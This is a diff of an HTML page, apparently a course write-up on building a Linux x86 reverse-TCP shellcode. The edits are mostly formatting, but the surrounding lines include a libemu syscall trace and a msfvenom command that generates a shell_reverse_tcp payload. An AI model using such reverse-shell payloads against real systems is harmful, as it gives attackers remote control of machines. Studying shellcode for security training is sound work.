@@ -1,6 +1,6 @@
 <br><div id="particles-js-background" class="container" ng-controller="mainController"> </div><div id="overlay" class="container" ng-controller="mainController"><br><br>
 
-<h2> Assignment 2: Shell_Reverse_TCP shellcode</h2><br>
+<h1> Assignment 2: Shell_Reverse_TCP shellcode</h1><br>
 <br>
 - Create a Shell_Reverse_TCP shellcode<br>
 <br>
@@ -37,7 +37,7 @@ The result:<br>
 <br>
 <img src="visual/images/slae/2/wrapper/4.png"><br>
 <br>
-Moreover, if the port causes problems, a warning message will appear:<br>
+Moreover, if the port number causes problems (generating a "\x00" opcode), a warning message will appear:<br>
 <br>
 <img src="visual/images/slae/2/wrapper/5.png"><br>
 <br>
@@ -52,6 +52,7 @@ Or we can use the libemu.sh script (in "scripts/" folder):<br>
 </code>
 <br>
 The result:
+<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">int socket (<br>
 int domain = 2;<br>
 int type = 1;<br>
@@ -115,9 +116,10 @@ The system calls and their values are:<br>
 - Execve:   11 (0xb)<br>
 <br>
 <br>
-Also it is important to know how the system calls work in Linux. As stated in the [Skape's paper about egghunters](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) "the system call interface that is exposed to user-mode applications in Linux (on IA32) is provided through soft-interrupt 0x80. The following table describes the register layout that is used across all system calls"<br>
+Also it is important to know how the system calls work in Linux. As stated in the <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Skape's paper about egghunters</a>  <i>"the system call interface that is exposed to user-mode applications in Linux (on IA32) is provided through soft-interrupt 0x80"</i><br>. The following table describes the register layout that is used across all system calls
 <br>
 <img src="visual/images/slae/2/wrapper/6.png"><br>
+<br>
 <br>
 Knowing this and the values from the Libemu's output, it is possible to write the nasm code.<br>
 
@@ -176,7 +178,6 @@ Detect where the port (8888 or 0x22b8 in hexadecimal), the IP and the auxiliar v
 Now we know the value in the original shellcode which must be substituted. After this, we just must take the input to the wrapper script, translate the port number to hexadecimal (in big endian format) and print the new shellcode with the port updated.<br>
 <br><br>
 <h2> Second approach: Ndisasm</h2><br>
-<br>
 A second approach, which can be considered easier, is to get the nasm file from the raw output from msfvenom:<br>
 <br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8888 --platform=Linux -a x86 -f raw | ndisasm -u -
 </code>
